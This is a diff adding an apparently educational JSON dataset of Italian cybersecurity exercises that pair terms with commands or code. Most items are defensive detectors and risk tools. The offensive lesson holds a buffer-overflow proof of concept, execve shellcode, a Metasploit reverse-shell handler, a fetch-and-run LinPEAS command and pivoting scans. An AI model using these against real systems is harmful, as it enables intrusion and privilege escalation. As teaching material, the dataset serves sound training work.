@@ -1,0 +1,256 @@
+{
+  "fixes": [
+    {
+      "level": "10",
+      "lesson": "adv_teams",
+      "english": "Adversary Simulation",
+      "set": {
+        "command": "atomic-red-team invoke-atomictest T1059.003 -PathToAtomicsFolder ./atomics",
+        "task": "Esegui un test atomico di Atomic Red Team per la tecnica T1059.003 in un cyber range isolato e verifica che il SIEM generi l'alert atteso."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_teams",
+      "english": "Threat Hunting",
+      "set": {
+        "code": "# Hunt for suspicious PowerShell encoded command execution\nimport pandas as pd\nfrom siem_client import query\n\nhunt = query(\n    \"index=edr EventCode=4688 process_name=powershell.exe\"\n    \" | search command_line=\\\"*-enc*\\\" OR command_line=\\\"*FromBase64*\\\"\"\n    \" | stats count by host user command_line\"\n)\nsuspicious = hunt[hunt['count'] < 5]\nsuspicious.to_csv('hunt_findings.csv', index=False)",
+        "task": "Implementa una query di threat hunting che parta dall'ipotesi di esecuzione di PowerShell offuscato e restituisca host, utente e comando da revisionare con il SOC."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Malware Analysis",
+      "set": {
+        "command": "clamscan --recursive --infected --detect-pua=yes /samples/quarantine/",
+        "task": "Analizza in modalita' batch una directory di sample in quarantena con ClamAV evidenziando solo i file infetti e i programmi potenzialmente indesiderati."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Static Analysis",
+      "set": {
+        "command": "strings -a -n 8 sample.bin | grep -Ei 'http://|\\.exe|cmd\\.exe|powershell' && objdump -d sample.bin | head -200",
+        "task": "Estrai le stringhe rilevanti e disassembla l'inizio del binario per mappare URL, import sospetti e flusso di esecuzione prima di detonarlo in sandbox."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Dynamic Analysis",
+      "set": {
+        "command": "strace -f -e trace=network,file,process -o sample.trace ./sample.bin",
+        "task": "Esegui il sample in una VM di laboratorio tracciando le syscall di rete, file e processo per documentare il comportamento dinamico del malware."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Reverse Engineering",
+      "set": {
+        "command": "r2 -A -q -c 'aaa; pdf @ main; iz' suspicious.bin",
+        "task": "Apri il binario in radare2, esegui l'analisi completa e stampa il disassemblato della funzione main per avviare il reverse engineering del campione."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Disassembler",
+      "set": {
+        "command": "objdump -d -M intel sample.exe | less",
+        "task": "Usa objdump come disassemblatore per ottenere l'assembly Intel del binario e individuare le routine chiave da approfondire in IDA o Ghidra."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Debugger",
+      "set": {
+        "command": "gdb -q --args ./sample.bin && (gdb) break main && (gdb) run",
+        "task": "Carica il sample in gdb in un ambiente isolato, imposta un breakpoint su main e avvia l'esecuzione controllata per analizzare lo stato di memoria."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Packer",
+      "set": {
+        "command": "upx -t suspicious.exe && die suspicious.exe",
+        "task": "Verifica se il binario e' impacchettato con UPX e identifica il packer impiegato tramite Detect It Easy prima di tentare l'unpacking in sandbox."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Obfuscation",
+      "set": {
+        "code": "# Defensive: detect base64-obfuscated PowerShell in command-line telemetry\nimport re\n\nB64_PATTERN = re.compile(r'(?:-enc(?:odedcommand)?|FromBase64String)\\s*[\\\"\\']?([A-Za-z0-9+/=]{40,})', re.IGNORECASE)\n\ndef flag_obfuscated(cmd: str) -> bool:\n    match = B64_PATTERN.search(cmd)\n    if not match:\n        return False\n    blob = match.group(1)\n    entropy = len(set(blob)) / len(blob)\n    return entropy > 0.45\n\nfor event in load_edr_events('today'):\n    if flag_obfuscated(event.command_line):\n        siem.alert('Possibile offuscamento PowerShell', event)",
+        "task": "Costruisci un detector che riconosca comandi PowerShell offuscati in base64, calcoli l'entropia del payload e inoltri un alert al SIEM."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Behavioral Signature",
+      "set": {
+        "code": "// YARA behavioral signature: process hollowing via WriteProcessMemory + SetThreadContext\nrule Behavior_Process_Hollowing {\n    meta:\n        author = \"blue-team\"\n        description = \"Rileva la firma comportamentale del process hollowing\"\n    strings:\n        $a = \"CreateProcessA\" ascii wide\n        $b = \"NtUnmapViewOfSection\" ascii wide\n        $c = \"WriteProcessMemory\" ascii wide\n        $d = \"SetThreadContext\" ascii wide\n        $e = \"ResumeThread\" ascii wide\n    condition:\n        all of them\n}",
+        "task": "Scrivi una firma comportamentale YARA che identifichi la combinazione di API tipica del process hollowing per usarla nella scansione delle workstation."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_malware",
+      "english": "Sandbox Escape",
+      "set": {
+        "code": "# Defensive: detect sandbox-aware checks performed by the sample\nSANDBOX_INDICATORS = [\n    'IsDebuggerPresent', 'CheckRemoteDebuggerPresent',\n    'GetTickCount', 'NtQuerySystemInformation',\n    'vmware', 'virtualbox', 'sandbox', 'cuckoo'\n]\n\ndef detect_sandbox_evasion(api_calls, strings):\n    hits = [ind for ind in SANDBOX_INDICATORS\n            if any(ind.lower() in s.lower() for s in strings + api_calls)]\n    if hits:\n        report('Sample esegue check anti-sandbox', indicators=hits)",
+        "task": "Implementa un controllo che analizzi API e stringhe del campione e segnali eventuali tentativi di evasione dalla sandbox prima di considerare benigno il file."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_apt",
+      "english": "Lateral Movement",
+      "set": {
+        "command": "bloodhound-python -u analyst -p 'Lab!Pass' -d corp.local -ns 10.0.0.10 -c All",
+        "task": "Raccogli i dati di Active Directory con BloodHound in laboratorio per mappare i possibili percorsi di movimento laterale e identificare i path piu' rischiosi da bonificare."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_apt",
+      "english": "Persistence",
+      "set": {
+        "command": "sudo auditctl -w /etc/systemd/system -p wa -k persistence_watch && sudo systemctl list-unit-files --state=enabled",
+        "task": "Configura auditd per monitorare scritture nelle unit systemd ed elenca i servizi abilitati alla ricerca di meccanismi di persistenza non autorizzati."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_apt",
+      "english": "Command and Control (C2)",
+      "set": {
+        "code": "# Defensive: detect periodic beaconing toward suspected C2 infrastructure\nimport scapy.all as scapy\nfrom collections import defaultdict\nimport statistics\n\nknown_c2 = load_threat_intel('c2-feed.json')\nintervals = defaultdict(list)\nlast_seen = {}\n\nfor pkt in scapy.sniff(filter='tcp port 443 or udp port 53', count=5000):\n    if scapy.IP not in pkt:\n        continue\n    dst = pkt[scapy.IP].dst\n    if dst in known_c2:\n        if dst in last_seen:\n            intervals[dst].append(pkt.time - last_seen[dst])\n        last_seen[dst] = pkt.time\n\nfor dst, deltas in intervals.items():\n    if len(deltas) > 5 and statistics.stdev(deltas) < 2:\n        siem.alert(f'Possibile callback C2 verso {dst}', deltas=deltas)",
+        "task": "Implementa un rilevatore di callback C2 che intercetti il traffico, lo confronti con un feed di threat intelligence e segnali pattern di beaconing regolare verso domini noti."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_apt",
+      "english": "Data Exfiltration",
+      "set": {
+        "command": "sudo tcpdump -i eth0 -nn 'udp port 53' -w dns.pcap and tshark -r dns.pcap -Y 'dns.qry.name.len > 50' -T fields -e dns.qry.name",
+        "task": "Cattura il traffico DNS sul gateway ed estrai le query con nomi anomalmente lunghi per identificare possibili tentativi di esfiltrazione dati via DNS tunneling."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_apt",
+      "english": "Living off the Land (LotL)",
+      "set": {
+        "command": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} | Where-Object {$_.Message -match 'IEX|Invoke-WebRequest|DownloadString'}",
+        "task": "Interroga il log operational di PowerShell sui endpoint per individuare uso di binari legittimi tipico delle tecniche LotL e prioritizzare le indagini del SOC."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_apt",
+      "english": "Beaconing",
+      "set": {
+        "code": "# Defensive: identify beaconing by clustering inter-arrival times per destination\nimport pandas as pd\n\nflows = pd.read_parquet('netflow.parquet')\nflows['delta'] = flows.groupby('dst_ip')['timestamp'].diff().dt.total_seconds()\n\nbeacons = (\n    flows.dropna(subset=['delta'])\n    .groupby('dst_ip')['delta']\n    .agg(['count', 'mean', 'std'])\n    .query('count >= 10 and std < 3 and mean.between(30, 3600)')\n)\nbeacons.to_csv('beaconing_candidates.csv')",
+        "task": "Analizza i netflow e individua i candidati a beaconing calcolando la deviazione standard degli intervalli verso ogni destinazione e isolando i pattern regolari."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_offensive",
+      "english": "Exploit Development",
+      "set": {
+        "code": "# Educational lab: classic stack buffer overflow PoC for a vulnerable training binary\n# Run ONLY against the dedicated CTF target in an isolated VM.\nimport struct\nimport socket\n\nTARGET = ('10.0.0.50', 9999)  # lab-only address\nOFFSET = 146                  # found via pattern_create / pattern_offset\nJMP_ESP = 0x625011AF          # non-ASLR module in the lab binary\nNOPS = b'\\x90' * 16\nSHELLCODE = b'\\xcc' * 32      # INT3 placeholder — replace with debug payload only\n\npayload = b'A' * OFFSET + struct.pack('<I', JMP_ESP) + NOPS + SHELLCODE\n\nwith socket.create_connection(TARGET, timeout=5) as s:\n    s.sendall(b'TRUN /.:/' + payload + b'\\r\\n')",
+        "task": "Costruisci un PoC didattico di stack buffer overflow contro il binario vulnerabile del laboratorio CTF, calcolando l'offset corretto e impostando un payload INT3 per studiare l'exploit development sotto debugger."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_offensive",
+      "english": "Fuzzing (Advanced)",
+      "set": {
+        "command": "afl-fuzz -i corpus_in/ -o findings/ -M master -- ./target_binary @@",
+        "task": "Avvia una sessione di fuzzing avanzato con AFL++ usando un corpus iniziale di input validi e raccogli i crash riproducibili nella directory findings per il triage."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_offensive",
+      "english": "Post-Exploitation",
+      "set": {
+        "command": "msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; run\"",
+        "task": "Avvia un handler Metasploit in laboratorio per ricevere la sessione Meterpreter del target di training e documentare le tecniche di post-exploitation osservate."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_offensive",
+      "english": "Shellcode",
+      "set": {
+        "code": "# Lab-only: minimal Linux x86_64 execve(\"/bin/sh\") shellcode for analysis\n# Used to study how EDR rules trigger on shellcode patterns in memory.\nshellcode = bytes([\n    0x48, 0x31, 0xd2,                         # xor rdx, rdx\n    0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69,       # mov rbx, '//bin/sh'\n    0x6e, 0x2f, 0x73, 0x68,\n    0x48, 0xc1, 0xeb, 0x08,                   # shr rbx, 8\n    0x53,                                     # push rbx\n    0x48, 0x89, 0xe7,                         # mov rdi, rsp\n    0x48, 0x31, 0xc0,                         # xor rax, rax\n    0xb0, 0x3b,                               # mov al, 0x3b (execve)\n    0x0f, 0x05                                # syscall\n])\nopen('shellcode.bin', 'wb').write(shellcode)",
+        "task": "Genera un blob di shellcode educativo execve(/bin/sh) e salvalo su file in un ambiente di laboratorio per studiare le firme di detection usate dagli EDR."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_offensive",
+      "english": "Privilege Escalation (Exploit)",
+      "set": {
+        "command": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh && bash /tmp/linpeas.sh -a > linpeas_report.txt",
+        "task": "Esegui LinPEAS sulla macchina di laboratorio per enumerare automaticamente i vettori di privilege escalation noti e produrre un report da revisionare con il team difensivo."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "adv_offensive",
+      "english": "Pivoting",
+      "set": {
+        "command": "ssh -D 1080 -N -f operator@jump.lab.local && proxychains4 nmap -sT -Pn 10.10.20.0/24",
+        "task": "Apri un tunnel SOCKS via SSH verso l'host pivot del laboratorio e usa proxychains per scansionare la sottorete interna mantenendo il traffico instradato attraverso il pivot."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "grc_compliance",
+      "english": "PII (Personally Identifiable Information)",
+      "set": {
+        "code": "# Defensive: scan a directory tree for likely PII (Italian fiscal code + emails)\nimport re\nimport pathlib\n\nFISCAL = re.compile(r'\\b[A-Z]{6}\\d{2}[A-EHLMPR-T]\\d{2}[A-Z]\\d{3}[A-Z]\\b')\nEMAIL = re.compile(r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}\\b')\n\nfindings = []\nfor path in pathlib.Path('/data/exports').rglob('*.csv'):\n    text = path.read_text(errors='ignore')\n    fiscal_hits = FISCAL.findall(text)\n    email_hits = EMAIL.findall(text)\n    if fiscal_hits or email_hits:\n        findings.append({'file': str(path), 'fiscal': len(fiscal_hits), 'email': len(email_hits)})\n\nfor row in findings:\n    print(row)",
+        "task": "Implementa uno scanner che esamini gli export CSV alla ricerca di PII come codici fiscali ed email, producendo un report da inoltrare al DPO per la valutazione GDPR."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "grc_compliance",
+      "english": "PHI (Protected Health Information)",
+      "set": {
+        "code": "# Defensive: redact PHI fields in a HL7-like record before sharing with analytics\nimport hashlib\n\nPHI_FIELDS = {'patient_id', 'ssn', 'name', 'dob', 'address', 'phone', 'mrn'}\n\ndef pseudonymize(record: dict, salt: str) -> dict:\n    safe = {}\n    for key, value in record.items():\n        if key in PHI_FIELDS and value:\n            safe[key] = hashlib.sha256((salt + str(value)).encode()).hexdigest()[:16]\n        else:\n            safe[key] = value\n    return safe\n\nfor record in load_emr_export():\n    write_to_warehouse(pseudonymize(record, salt=SECRETS['phi_salt']))",
+        "task": "Costruisci una pipeline che pseudonimizzi i campi PHI in uscita dall'EMR usando un hash salato, in modo da poter condividere i dati con l'analytics nel rispetto di HIPAA."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "grc_risk",
+      "english": "Quantitative Risk Analysis",
+      "set": {
+        "code": "# Annualized Loss Expectancy (ALE) for quantitative risk analysis\n# ALE = SLE * ARO where SLE = AV * EF\n\ndef ale(asset_value: float, exposure_factor: float, annual_rate: float) -> float:\n    sle = asset_value * exposure_factor\n    return sle * annual_rate\n\nscenarios = [\n    {'name': 'Ransomware su file server', 'av': 500_000, 'ef': 0.6, 'aro': 0.25},\n    {'name': 'Data breach CRM',          'av': 1_200_000, 'ef': 0.3, 'aro': 0.1},\n    {'name': 'DDoS su e-commerce',       'av': 200_000, 'ef': 0.4, 'aro': 1.5},\n]\n\nfor s in scenarios:\n    s['ale'] = ale(s['av'], s['ef'], s['aro'])\n    print(f\"{s['name']:35s} ALE = EUR {s['ale']:>12,.0f}\")",
+        "task": "Calcola l'Annualized Loss Expectancy per un set di scenari di rischio combinando valore dell'asset, exposure factor e tasso annuo, per supportare la presentazione al board con cifre quantitative."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "grc_risk",
+      "english": "Qualitative Risk Analysis",
+      "set": {
+        "code": "# Qualitative risk matrix: map likelihood x impact to a risk tier\nLIKELIHOOD = {'rara': 1, 'improbabile': 2, 'possibile': 3, 'probabile': 4, 'quasi_certa': 5}\nIMPACT = {'trascurabile': 1, 'minore': 2, 'moderato': 3, 'maggiore': 4, 'catastrofico': 5}\n\ndef tier(likelihood: str, impact: str) -> str:\n    score = LIKELIHOOD[likelihood] * IMPACT[impact]\n    if score >= 15: return 'CRITICO'\n    if score >= 9:  return 'ALTO'\n    if score >= 4:  return 'MEDIO'\n    return 'BASSO'\n\nregister = [\n    ('Furto laptop',         'possibile',  'moderato'),\n    ('Insider malevolo',     'improbabile','maggiore'),\n    ('Phishing del CEO',     'probabile',  'maggiore'),\n]\nfor name, lk, im in register:\n    print(f'{name:25s} -> {tier(lk, im)}')",
+        "task": "Implementa una matrice qualitativa likelihood-per-impatto che classifichi ogni voce del registro rischi in una fascia da BASSO a CRITICO, utile per i team che non dispongono di dati quantitativi."
+      }
+    }
+  ]
+}
